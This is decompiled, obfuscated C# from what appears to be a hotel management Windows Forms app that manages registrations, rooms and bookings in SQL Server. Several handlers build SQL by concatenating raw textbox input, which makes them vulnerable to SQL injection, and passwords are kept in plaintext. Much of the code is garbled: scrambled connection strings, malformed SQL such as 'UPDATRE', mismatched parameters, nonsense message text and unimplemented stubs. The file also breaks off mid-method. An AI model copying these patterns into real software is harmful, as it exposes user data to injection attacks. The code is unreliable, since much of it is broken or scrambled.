using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Qb9n3;
using Sw84Mc;
using c6J5Kz;
using e8JYt9;
using g2HAj9;
using g9MJo6;
using o4H9Kj;

namespace Jx02R;

public class Cs6t4
{
	private SqlConnection con;

	private object TextBoxUName;

	private object TextBoxLName;

	private object TextBoxNumber;

	private object TextBoxPassword;

	private object TextBoxRoomID;

	private object TextBoxBookingID;

	private object TextBoxRoom;

	private object ComboBoxRoomType;

	private object TextBoxRoomPrice;

	private object RoomTableAdapter;

	private object TextBoxPaymentID;

	private object TextBoxCustomerName;

	private object TextBoxBankName;

	private object PaymentsTableAdapter;

	private object Database2DataSet2;

	private object Customer;

	private object Welcome;

	internal static o6RWk9 o6RWk9_0/* Not supported: data(BF 0C 91 22 35 4D 11 B6 BB B1 60 0C 11 99 28 4B 4A CE B6 B1 F9 AE 22 1C B1 E1 7A 09 56 6C 9B 3D 95 40 81 8D E0 5D A7 2C 32 D1 27 EE 60 B2 F7 64 1A A6 14 B2 B7 0F A7 34 0D 85 28 97 ED A8 03 21 E0 1C 08 25 6A EA 6D 30 97 F3 9F 16 EC 1E 1B BD 91 D3 09 31 96 F2 CB E8 CA F1 FA 91 99 9A 2C F6 77 AA AC DA 2E 0E A7 27 D6 70 96 DB D8 69 97 1E 2F 70 3D E8 F7 0F A6 FF A8 FC 69 64 19 C6 22 37 C9 08 F6 8D 41 FF A8 BC 0E 1F E9 3B 02 4A F5 29 94 6E C4 A0 15 59 29 A0 8F FB 94 C9 2C 73 1F 14 7A 17 8A 19 2E 8A 5F AA F9 88 45 81 2B B0 49 41 2F BB D3 CB 3D C0 5A 0B A8 06 45 1F 72 C0 27 6F EE 6A 74 BB 02 E0 D3 63 B8 92 F0 DD 1E D7 8E 6E A9 90 38 E4 12 B9 10 D0 80 82 AE C9 06 23 99 A6 10 75 D6 FB 2B E8 1D E3 3A DA BA 1B 27 AE 83 87 C9 DD F8 BD 79 01 3A 53 AA 7B A8 3E 4D 23 4E 4F 50 E0 ED E9 3A 35 1B 40 91 E9 58 0F 66 81 89 39 6B 42 A0 1B B5 19 C0 A4 31 C8 1A E0 C7 BE 80 F1 CC A8 A3 19 48 96 D0 0A 19 37 53 DD EC 94 33 4F 4C 0D 7F 58 08 86 BF D4 77 DC E3 83 E2 F2 00 52 EA C0 C3 69 BF EF 91 98 73 94 EA E2 07 BD B8 65 70 7A A1 AE B2 A0 99 BE 04 02 67 09 50 BF AE FD 2F FF F7 0F 6C AA 07 62 5F A8 7C 18 35 18 FD 02 01 55 06 E6 CE 32 12 91 4E 89 A6 AC 11 5D 86 BE BC 28 B3 C7 D4 E3 6E 5E 5A F0 36 26 0D 5D E1 C5 9A 5C 90 30 5F 90 77 88 A0 3C 51 D6 2F 4D E5 03 2D 99 59 88 8E D5 7F CC 76 D9 DB 90 A0 A9 6E A8 8E 51 C1 EC 90 43 6C AE 1B B0 F5 2B 68 DC C8 CD 8F 51 2B E2 DD 95 4F 3A 91 25 E1 60 54 0D F9 D8 E9 B2 8A E4 6C 05 CF 77 1B 88 BC 8F 5B C6 AF 7E D6 98 E8 2E E3 F7 F5 00 16 D7 91 90 0E E5 DF 97 13 1E 66 3B E0 0C 98 03 A5 E2 9F AE C5 15 A5 30 26 54 96 C2 E7 36 73 5A 73 40 E0 12 52 DE 4C 38 04 7B 94 FC 96 19 EA F4 6E 8B D0 31 52 20 D0 C1 65 26 DF C4 95 15 32 81 11 34 73 DB B0 F6 FD C0 1C FD FC FD 3B 1C 2A EA 00 54 BC 09 53 F6 49 04 C5 CE C6 D4 A8 23 84 C5 D5 58 E8 6B 3B 3E F6 85 94 50 96 BF EF 85 80 DA FB 76 23 F0 71 0C 41 EC 13 1B 0F 4B 31 DD C5 1D 0A 99 91 94 93 FC B2 78 E4 CB E9 75 56 5D 75 42 A3 F6 27 F4 4A E4 48 71 41 06 4C 15 25 26 A7 B6 27 0E CC 5A FA 68 7C BA A3 86 9E 8F 9D 30 79 74 83 55 2F 1C 02 4A F8 0C 8B F1 F9 2F 17 CF F1 08 89 2C 8D D8 3E 6B 34 3A 32 D8 F5 AA 9F F9 EB E2 91 0E C4 FB 51 8F 6C 5C 4B DB A6 14 3F D4 AE 61 FE C9 C8 55) */;

	internal static char[] char_0;

	private Gd13P.Qr62Z qr62Z_0 = new Gd13P.Qr62Z();

	public Cs6t4()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		con = new SqlConnection();
		DbCommand dbCommand = (DbCommand)new SqlCommand();
		qr62Z_0.sqlCommand_0 = (SqlCommand)dbCommand;
	}

	private void Tg8c7(object sender, EventArgs e)
	{
		a6Z0B();
		a6GYz3.Rd7w8L();
	}

	private void No05W(object sender, EventArgs e)
	{
		a6Z0B();
		Bi18Zt.Ya57Ek();
	}

	private void w3E8Y(object sender, EventArgs e)
	{
		a6Z0B();
		NewLateBinding.LateCall(qr62Z_0.object_0, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void Qb15M(object sender, EventArgs e)
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
		con.set_ConnectionString("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=C:\\Users\\allot\\OneDrive\\Desktop\\Hotel management\\Hotel management\\Database1.mdf;Integrated Security=True");
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(TextBoxUName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			MessageBox.Show("Empty Id");
			return;
		}
		DbCommand dbCommand = (DbCommand)new SqlCommand("UPDATE register SET Firstname = @fname ,Lastname = @lname , Gender= @gender, Phonenumber= @pnumber,  Password=@password WHERE Username = @username", con);
		((SqlCommand)dbCommand).get_Parameters().Add("@fname", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(qr62Z_0.object_1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)dbCommand).get_Parameters().Add("@lname", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxLName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)dbCommand).get_Parameters().Add("@gender", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(qr62Z_0.object_2, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).get_Parameters().Add("@pnumber", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).get_Parameters().Add("@password", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxPassword, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)dbCommand).get_Parameters().Add("@username", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxUName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		con.Open();
		if (((SqlCommand)dbCommand).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("User Login Details Updated");
		}
		else
		{
			MessageBox.Show("User login Details Not Updated");
		}
		con.Close();
	}

	private void Lg8b1(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		DbConnection dbConnection = (DbConnection)new SqlConnection("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=C:\\Users\\allot\\OneDrive\\Desktop\\Hotel management\\Hotel management\\Database1.mdf;Integrated Security=True");
		object obj = (object)new SqlCommand("DELETE FROM register WHERE Username = @username", (SqlConnection)dbConnection);
		((SqlCommand)obj).get_Parameters().Add("@username", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxUName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Open();
		if (((SqlCommand)((obj is SqlCommand) ? obj : null)).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("User login details Deleted");
		}
		else
		{
			MessageBox.Show("User login details Not Deleted");
		}
		((SqlConnection)dbConnection).Close();
	}

	private void m6E4Z(object sender, EventArgs e)
	{
		d3LYm9.n4E7Cp();
	}

	private void Wx4o0(object sender, EventArgs e)
	{
		Cc2o6();
		NewLateBinding.LateCall(qr62Z_0.object_3, (Type)null, "EndEdit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object object_ = qr62Z_0.object_4;
		object[] array = new object[1];
		ref object object_2 = ref qr62Z_0.object_5;
		array[0] = object_2;
		object obj = array;
		bool[] obj2 = new bool[1] { true };
		object obj3 = obj2;
		NewLateBinding.LateCall(object_, (Type)null, "UpdateAll", array, (string[])null, (Type[])null, obj2, true);
		if (((bool[])obj3)[0])
		{
			object_2 = RuntimeHelpers.GetObjectValue(((object[])obj)[0]);
		}
	}

	private void Cc2o6()
	{
		throw new NotImplementedException();
	}

	private void Pd0a5(object sender, EventArgs e)
	{
		object object_ = qr62Z_0.object_6;
		object[] array = new object[1];
		object object_2 = qr62Z_0.object_5;
		array[0] = NewLateBinding.LateGet(object_2, (Type)null, "Register", new object[0], (string[])null, (Type[])null, (bool[])null);
		object obj = array;
		bool[] obj2 = new bool[1] { true };
		object obj3 = obj2;
		NewLateBinding.LateCall(object_, (Type)null, "Fill", array, (string[])null, (Type[])null, obj2, true);
		if (((bool[])obj3)[0])
		{
			NewLateBinding.LateSetComplex(object_2, (Type)null, "Register", new object[1] { ((object[])obj)[0] }, (string[])null, (Type[])null, true, false);
		}
	}

	private void Wy6d0(object sender, EventArgs e)
	{
	}

	private void o4FYm(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0217: Unknown result type (might be due to invalid IL or missing references)
		//IL_021d: Expected O, but got Unknown
		//IL_037b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0384: Unknown result type (might be due to invalid IL or missing references)
		//IL_039b: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c7: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			DbConnection dbConnection = (DbConnection)new SqlConnection();
			ICloneable cloneable = (ICloneable)new SqlCommand();
			((SqlConnection)dbConnection).set_ConnectionString("");
			((SqlConnection)dbConnection).Open();
			((SqlCommand)cloneable).set_Connection((SqlConnection)dbConnection);
			((SqlCommand)cloneable).set_CommandType(CommandType.Text);
			((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).set_CommandText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"'", NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' ")));
			object obj = ((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).ExecuteReader();
			if (((SqlDataReader)obj).get_HasRows())
			{
				Interaction.MsgBox((object)"", (MsgBoxStyle)16, (object)null);
				((SqlConnection)dbConnection).Close();
			}
			else
			{
				((SqlConnection)dbConnection).Close();
				((SqlConnection)dbConnection).Open();
				cloneable = (ICloneable)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)" ('", NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxBookingID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxRoom, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(ComboBoxRoomType, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"','"), (object)NewLateBinding.LateGet(qr62Z_0.object_7, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"','"), NewLateBinding.LateGet(TextBoxRoomPrice, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(qr62Z_0.object_8, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"')")), (SqlConnection)(object)((dbConnection is SqlConnection) ? dbConnection : null));
				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxBookingID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxRoom, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), (object)(Operators.CompareString(NewLateBinding.LateGet(ComboBoxRoomType, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0)), (object)(Operators.CompareString(NewLateBinding.LateGet(qr62Z_0.object_7, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxRoomPrice, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), (object)(Operators.CompareString(NewLateBinding.LateGet(qr62Z_0.object_8, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0))))
				{
					MessageBox.Show("");
				}
				else
				{
					((SqlCommand)cloneable).ExecuteNonQuery();
					Interaction.MsgBox((object)"", (MsgBoxStyle)64, (object)"");
				}
				((SqlConnection)dbConnection).Close();
			}
			((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void x1HPg(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_021a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0227: Unknown result type (might be due to invalid IL or missing references)
		object obj = (object)new SqlConnection("Dated Security=True");
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			MessageBox.Show("Empty Id");
			return;
		}
		object obj2 = (object)new SqlCommand("UPDATRE roomid = @id", (SqlConnection)obj);
		((SqlCommand)obj2).get_Parameters().Add("@boingid", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxBookingID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)obj2).get_Parameters().Add("@rom", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxRoom, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)obj2).get_Parameters().Add("@rooype", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(ComboBoxRoomType, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)obj2).get_Parameters().Add("@bedoice", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(qr62Z_0.object_7, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).get_Parameters().Add("@roorice", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxRoomPrice, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)obj2).get_Parameters().Add("@", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(qr62Z_0.object_8, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)obj2).get_Parameters().Add("@i", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)obj).Open();
		if (((SqlCommand)obj2).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Ro Updsdryyated");
		}
		else
		{
			MessageBox.Show("Rodgeryyted");
		}
		((SqlConnection)((obj is SqlConnection) ? obj : null)).Close();
	}

	private void c4L0Y(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		DbConnection dbConnection = (DbConnection)new SqlConnection("eryru6i6");
		DbCommand dbCommand = (DbCommand)new SqlCommand("eryu6u656u= @id", (SqlConnection)dbConnection);
		((SqlCommand)dbCommand).get_Parameters().Add("@ityutyutd", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxRoomID, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Open();
		if (((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Roo45745745m utyyur6Deleted");
		}
		else
		{
			MessageBox.Show("Room45767557657 N756ot 56765757Deleted");
		}
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
	}

	private void Yp58M(object sender, EventArgs e)
	{
		a6Z0B();
		NewLateBinding.LateCall(qr62Z_0.object_9, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void Zi54F(object sender, EventArgs e)
	{
		t1N8Ef.n8E6Hg();
	}

	private void Fp10J(object sender, EventArgs e)
	{
		Cc2o6();
		NewLateBinding.LateCall(m3QKb(), (Type)null, "EndEdit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object object_ = qr62Z_0.object_4;
		object[] array = new object[1];
		ref object object_2 = ref qr62Z_0.object_10;
		array[0] = object_2;
		object obj = array;
		bool[] obj2 = new bool[1] { true };
		object obj3 = obj2;
		NewLateBinding.LateCall(object_, (Type)null, "UpdateAll", array, (string[])null, (Type[])null, obj2, true);
		if (((bool[])obj3)[0])
		{
			object_2 = RuntimeHelpers.GetObjectValue(((object[])obj)[0]);
		}
	}

	private object m3QKb()
	{
		throw new NotImplementedException();
	}

	private void Qn5m7(object sender, EventArgs e)
	{
		object roomTableAdapter = RoomTableAdapter;
		object[] array = new object[1];
		object object_ = qr62Z_0.object_10;
		array[0] = NewLateBinding.LateGet(object_, (Type)null, "Room", new object[0], (string[])null, (Type[])null, (bool[])null);
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		Array array3 = obj;
		NewLateBinding.LateCall(roomTableAdapter, (Type)null, "Fill", array, (string[])null, (Type[])null, obj, true);
		if (((bool[])array3)[0])
		{
			NewLateBinding.LateSetComplex(object_, (Type)null, "Room", new object[1] { (array2 as object[])[0] }, (string[])null, (Type[])null, true, false);
		}
	}

	internal static void Hb6f3()
	{
		throw new NotImplementedException();
	}

	private void x7APo(object sender, EventArgs e)
	{
	}

	private void o6EBy(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ea: Expected O, but got Unknown
		//IL_0304: Unknown result type (might be due to invalid IL or missing references)
		//IL_0324: Unknown result type (might be due to invalid IL or missing references)
		//IL_035b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ICloneable cloneable = (ICloneable)new SqlConnection();
			ICloneable cloneable2 = (ICloneable)new SqlCommand();
			((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).set_ConnectionString("dsfsdtyu58");
			((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).Open();
			((SqlCommand)((cloneable2 is SqlCommand) ? cloneable2 : null)).set_Connection((SqlConnection)cloneable);
			((SqlCommand)cloneable2).set_CommandType(CommandType.Text);
			((SqlCommand)((cloneable2 is SqlCommand) ? cloneable2 : null)).set_CommandText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"jhjo78jyj", NewLateBinding.LateGet(TextBoxUName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' ")));
			IDisposable disposable = (IDisposable)((SqlCommand)((cloneable2 is SqlCommand) ? cloneable2 : null)).ExecuteReader();
			if (((SqlDataReader)((disposable is SqlDataReader) ? disposable : null)).get_HasRows())
			{
				Interaction.MsgBox((object)"sd46", (MsgBoxStyle)16, (object)null);
				((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).Close();
			}
			else
			{
				((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).Close();
				((SqlConnection)cloneable).Open();
				cloneable2 = (ICloneable)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"sdgeruii('", NewLateBinding.LateGet(qr62Z_0.object_1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxLName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(qr62Z_0.object_2, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"','"), NewLateBinding.LateGet(TextBoxNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxUName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxPassword, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')")), (SqlConnection)((cloneable is SqlConnection) ? cloneable : null));
				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(qr62Z_0.object_1, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxLName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), (object)(Operators.CompareString(NewLateBinding.LateGet(qr62Z_0.object_2, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxUName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxPassword, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
				{
					MessageBox.Show("Pleasiuhioujoiijioope enter the dkjfdrew57etails");
				}
				else
				{
					((SqlCommand)((cloneable2 is SqlCommand) ? cloneable2 : null)).ExecuteNonQuery();
					Interaction.MsgBox((object)"Succfgxrerssfully Regiuiojojistered.", (MsgBoxStyle)64, (object)"Sugcfy898ccess");
					a6Z0B();
					Bi18Zt.Ya57Ek();
				}
				((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).Close();
			}
			((SqlConnection)((cloneable is SqlConnection) ? cloneable : null)).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"kkkkkpo9", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void o8FJx(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bb: Expected O, but got Unknown
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bc: Expected O, but got Unknown
		//IL_029f: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02eb: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ICloneable cloneable = (ICloneable)new SqlConnection();
